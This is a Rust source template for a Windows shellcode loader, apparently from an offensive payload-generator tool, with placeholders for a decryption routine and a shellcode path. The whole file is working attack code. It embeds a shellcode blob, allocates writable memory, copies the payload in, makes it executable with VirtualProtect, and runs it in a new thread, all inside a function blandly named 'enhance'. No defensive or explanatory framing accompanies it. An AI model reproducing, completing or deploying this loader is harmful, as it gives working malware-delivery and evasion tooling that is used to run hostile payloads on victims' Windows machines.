use windows::Win32::System::Memory::VirtualAlloc;
use windows::Win32::System::Memory::VirtualProtect;
use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows::Win32::System::Threading::CreateThread;
use windows::Win32::System::Threading::WaitForSingleObject;
use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;
use std::include_bytes;
{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn enhance(buf: &Vec<u8>) {
    unsafe {
        let alloc = VirtualAlloc(None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let alloc_ptr: *mut u8 = alloc as *mut u8;
        std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf.len());
        let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READ;
        VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READ, &mut old_perms);
        let res_ct = CreateThread(
            None,
            0,
            Some(std::mem::transmute(alloc)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .unwrap();
        let _ = WaitForSingleObject(res_ct, u32::MAX);
    }
}
fn main() {
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    {{MAIN}}
    enhance(&vec);
}